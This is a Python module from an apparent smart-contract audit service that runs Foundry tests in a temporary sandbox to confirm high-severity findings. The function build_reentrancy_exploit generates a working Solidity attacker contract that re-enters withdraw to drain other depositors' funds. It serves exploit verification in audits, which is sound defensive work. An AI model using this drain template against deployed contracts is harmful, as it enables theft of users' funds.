from __future__ import annotations

import asyncio
import json
import re
import shutil
import tempfile
import time
from dataclasses import dataclass
from pathlib import Path

from wr3_api.core.config import get_settings
from wr3_api.domain.enums import Chain, Severity
from wr3_api.domain.schemas import AuditEvent, AuditRecord, EngineRunSummary, Finding
from wr3_api.services.artifacts import ArtifactEncryptionRequired, ArtifactVault
from wr3_api.services.sandbox import SandboxPolicy
from wr3_api.services.tool_paths import tool_subprocess_env


@dataclass(frozen=True)
class PocWorkerResult:
    status: str
    duration_ms: int
    candidate_count: int
    artifact_uri: str | None = None
    error: str | None = None
    attempts: int = 0
    confirmed_finding_ids: tuple[str, ...] = ()


class FoundryPocWorker:
    name = "foundry_poc"

    def __init__(self, sandbox_policy: SandboxPolicy | None = None) -> None:
        settings = get_settings()
        self._sandbox_policy = sandbox_policy or SandboxPolicy(
            allowed_rpc_hosts=settings.sandbox_allowed_rpc_hosts,
            timeout_seconds=settings.sandbox_default_timeout_seconds,
        )
        self._max_attempts = settings.poc_max_attempts
        self._artifact_vault = ArtifactVault()

    def should_consider(self, record: AuditRecord) -> bool:
        return record.request.requested_depth in {"standard", "deep"}

    async def run(self, record: AuditRecord, candidates: list[Finding]) -> PocWorkerResult:
        started = time.perf_counter()
        if record.request.chain == Chain.SOLANA:
            return self._skipped(started, candidates, "solana_poc_uses_trident_not_foundry")
        if not candidates:
            return self._skipped(started, candidates, "poc_no_high_or_critical_candidates")
        decision = self._sandbox_policy.validate_argv(["forge", "test", "--json"])
        if not decision.allowed:
            return self._skipped(started, candidates, decision.reason)
        if shutil.which("forge") is None:
            return self._skipped(started, candidates, "foundry_binary_missing")
        return await self._run_retry_loop(record, candidates, started)

    def record_result(self, record: AuditRecord, result: PocWorkerResult, candidates: list[Finding]) -> None:
        if result.error:
            record.limitations.append(result.error)
        artifact_uri = result.artifact_uri or self._store_status_artifact(record, result, candidates)
        record.engine_runs.append(
            EngineRunSummary(
                audit_id=record.audit_id,
                engine=self.name,
                status=result.status,
                duration_ms=result.duration_ms,
                artifact_uri=artifact_uri,
                error=result.error,
            )
        )
        record.events.append(
            AuditEvent(
                audit_id=record.audit_id,
                event_type="poc_worker_result",
                payload={
                    "worker": self.name,
                    "status": result.status,
                    "candidate_count": result.candidate_count,
                    "candidate_ids": [finding.id for finding in candidates],
                    "attempts": result.attempts,
                    "confirmed_finding_ids": list(result.confirmed_finding_ids),
                    "artifact_private": artifact_uri is not None,
                    "artifact_uri": artifact_uri,
                    "error": result.error,
                },
            )
        )

    def _store_status_artifact(
        self,
        record: AuditRecord,
        result: PocWorkerResult,
        candidates: list[Finding],
    ) -> str | None:
        try:
            artifact = self._artifact_vault.store_json(
                audit_id=str(record.audit_id),
                kind="poc",
                payload={
                    "worker": self.name,
                    "status": result.status,
                    "reason": result.error,
                    "attempts": result.attempts,
                    "candidate_ids": [finding.id for finding in candidates],
                    "confirmed_finding_ids": list(result.confirmed_finding_ids),
                    "mode": "localhost_safe_status_artifact",
                },
                private=True,
            )
            return artifact.uri
        except ArtifactEncryptionRequired:
            record.limitations.append("poc_status_artifact_requires_encryption")
            return None

    def _skipped(
        self,
        started: float,
        candidates: list[Finding],
        reason: str,
    ) -> PocWorkerResult:
        return PocWorkerResult(
            status="skipped",
            duration_ms=int((time.perf_counter() - started) * 1000),
            candidate_count=len(candidates),
            error=reason,
        )

    async def _run_retry_loop(
        self,
        record: AuditRecord,
        candidates: list[Finding],
        started: float,
    ) -> PocWorkerResult:
        attempts: list[dict[str, object]] = []
        last_error: str | None = None
        confirmed: list[str] = []
        with tempfile.TemporaryDirectory(prefix="wr3-foundry-poc-") as temp_dir:
            root = Path(temp_dir)
            (root / "src").mkdir()
            (root / "test").mkdir()
            source_text = record.request.source or ""
            source_with_pragma = ensure_solidity_pragma(source_text)
            (root / "src" / "Target.sol").write_text(source_with_pragma, encoding="utf-8")
            (root / "foundry.toml").write_text("[profile.default]\nsrc='src'\ntest='test'\n", encoding="utf-8")

            target_name = extract_primary_contract(source_with_pragma)
            exploit_candidate = pick_exploit_candidate(candidates, source_with_pragma, target_name)

            for attempt in range(1, self._max_attempts + 1):
                test_source = build_foundry_test(
                    candidates,
                    attempt,
                    last_error,
                    source=source_with_pragma,
                    target_name=target_name,
                    exploit_candidate=exploit_candidate,
                )
                (root / "test" / "Wr3PoC.t.sol").write_text(test_source, encoding="utf-8")
                proc = await asyncio.create_subprocess_exec(
                    "forge",
                    "test",
                    "--json",
                    cwd=root,
                    env=tool_subprocess_env(),
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                try:
                    stdout, stderr = await asyncio.wait_for(
                        proc.communicate(),
                        timeout=self._sandbox_policy.timeout_seconds,
                    )
                except TimeoutError:
                    proc.kill()
                    last_error = "forge_test_timeout"
                    attempts.append({"attempt": attempt, "status": "timeout"})
                    continue
                stdout_text = stdout.decode(errors="replace")
                stderr_text = stderr.decode(errors="replace")
                attempts.append(
                    {
                        "attempt": attempt,
                        "returncode": proc.returncode,
                        "stdout": stdout_text[-4000:],
                        "stderr": stderr_text[-4000:],
                    }
                )
                if proc.returncode == 0 and is_generated_poc_meaningful(candidates, test_source):
                    target_finding = exploit_candidate or candidates[0]
                    confirmed = [target_finding.id]
                    break
                last_error = stderr_text or stdout_text or f"forge_returncode_{proc.returncode}"

        artifact_uri = None
        artifact_error = None
        try:
            artifact = self._artifact_vault.store_json(
                audit_id=str(record.audit_id),
                kind="poc",
                payload={
                    "worker": self.name,
                    "attempts": attempts,
                    "candidate_ids": [finding.id for finding in candidates],
                    "confirmed_finding_ids": confirmed,
                },
                private=True,
            )
            artifact_uri = artifact.uri
        except ArtifactEncryptionRequired:
            artifact_error = "poc_artifact_requires_encryption"

        status = "confirmed" if confirmed else "attempted"
        return PocWorkerResult(
            status=status,
            duration_ms=int((time.perf_counter() - started) * 1000),
            candidate_count=len(candidates),
            artifact_uri=artifact_uri,
            error=artifact_error or (None if confirmed else "poc_not_confirmed_after_retry_loop"),
            attempts=len(attempts),
            confirmed_finding_ids=tuple(confirmed),
        )


def high_risk_poc_candidates(findings: list[Finding]) -> list[Finding]:
    return [
        finding
        for finding in findings
        if finding.severity in {Severity.CRITICAL, Severity.HIGH}
        and finding.exploitability != "dismissed"
    ]


def ensure_solidity_pragma(source: str) -> str:
    if "pragma solidity" in source:
        return source
    return "pragma solidity ^0.8.20;\n" + source


_REENTRANCY_HINTS = ("reentr", "reentrancy")


def extract_primary_contract(source: str) -> str | None:
    """Name the contract the PoC should instantiate.

    The exploit references the target by name, so prefer the contract whose body
    holds the vulnerable ``withdraw`` sink over any interface/library declared
    earlier in the file. Returns None when nothing parseable is present.
    """
    names = re.findall(r"\bcontract\s+([A-Za-z_]\w*)", source)
    if not names:
        return None
    for name in names:
        start = source.find(f"contract {name}")
        if start != -1 and "withdraw" in source[start : start + 6000]:
            return name
    return names[-1]


def pick_exploit_candidate(
    candidates: list[Finding],
    source: str,
    target_name: str | None,
) -> Finding | None:
    """Choose a finding we can build a *real*, self-checking exploit for.

    Today that means the canonical reentrancy drain: a ``deposit``/``withdraw``
    pair whose external call fires before the balance is zeroed. When no
    candidate matches that shape we return None, the worker falls back to the
    inert compile-only harness, and the finding stays unconfirmed — we never
    fabricate a confirmation we cannot demonstrate.
    """
    if not target_name:
        return None
    lowered = source.lower()
    if "function deposit" not in lowered or "function withdraw" not in lowered:
        return None
    if "call{value" not in lowered.replace(" ", ""):
        return None
    for finding in candidates:
        haystack = f"{finding.summary} {finding.taxonomy.wr3_category} {finding.description}".lower()
        if any(hint in haystack for hint in _REENTRANCY_HINTS):
            return finding
    return None


def build_foundry_test(
    candidates: list[Finding],
    attempt: int,
    last_error: str | None,
    *,
    source: str = "",
    target_name: str | None = None,
    exploit_candidate: Finding | None = None,
) -> str:
    if exploit_candidate is not None and target_name:
        return build_reentrancy_exploit(target_name, attempt, exploit_candidate)
    finding = candidates[0] if candidates else None
    summary = (finding.summary if finding else "No candidate").replace("*/", "* /")
    category = finding.taxonomy.wr3_category if finding else "none"
    safe_last_error = (last_error or "none").replace("*/", "* /")[-600:]
    return f"""// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

/*
wr3 generated PoC harness attempt {attempt}
candidate: {summary}
category: {category}
previous_error: {safe_last_error}
This harness is executed only in an isolated Foundry temp directory.
*/
import "../src/Target.sol";

contract Wr3PoCTest {{
    function testWr3HarnessCompiles() public pure {{
        require(bytes("{category}").length > 0, "wr3-empty-category");
    }}
}}
"""


def build_reentrancy_exploit(target_name: str, attempt: int, finding: Finding) -> str:
    """Generate a Foundry test that genuinely drains a reentrant contract.

    An honest depositor seeds the pool, then an attacker contract re-enters
    ``withdraw`` until the contract is empty. ``forge test`` exits 0 only when
    the drain actually succeeds, so a passing run is real proof of
    exploitability rather than a stub. The ``WR3_CONFIRMED_EXPLOIT_ASSERTION``
    marker signals to the worker that this harness is a confirming exploit, not
    the inert compile probe. If the target is not in fact reentrant the
    assertions revert, ``forge`` returns non-zero, and nothing is confirmed.
    """
    safe_summary = finding.summary.replace("*/", "* /")[:200]
    return f"""// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// wr3 reentrancy PoC attempt {attempt}
// finding: {safe_summary}
import "../src/Target.sol";

interface IWr3Vm {{
    function deal(address who, uint256 newBalance) external;
}}

contract Wr3ReentrancyAttacker {{
    {target_name} private target;
    uint256 private stake;

    constructor({target_name} _target) {{
        target = _target;
    }}

    function attack() external payable {{
        stake = msg.value;
        target.deposit{{value: msg.value}}();
        target.withdraw();
    }}

    receive() external payable {{
        if (address(target).balance >= stake && stake > 0) {{
            target.withdraw();
        }}
    }}
}}

contract Wr3PoCTest {{
    IWr3Vm private constant vm = IWr3Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function testWr3ReentrancyDrain() public {{
        {target_name} target = new {target_name}();
        vm.deal(address(this), 100 ether);

        // Honest depositors fund the pool.
        uint256 pool = 5 ether;
        target.deposit{{value: pool}}();

        // Attacker stakes a single unit and re-enters until the pool is empty.
        Wr3ReentrancyAttacker attacker = new Wr3ReentrancyAttacker(target);
        uint256 stake = 1 ether;
        attacker.attack{{value: stake}}();

        // WR3_CONFIRMED_EXPLOIT_ASSERTION: the attacker withdrew strictly more
        // than it staked, i.e. it stole other depositors' funds via reentrancy.
        require(address(attacker).balance > stake, "wr3: reentrancy did not profit");
        require(address(target).balance < pool, "wr3: victim pool not drained");
    }}
}}
"""


def is_generated_poc_meaningful(candidates: list[Finding], test_source: str) -> bool:
    if not candidates:
        return False
    return "WR3_CONFIRMED_EXPLOIT_ASSERTION" in test_source
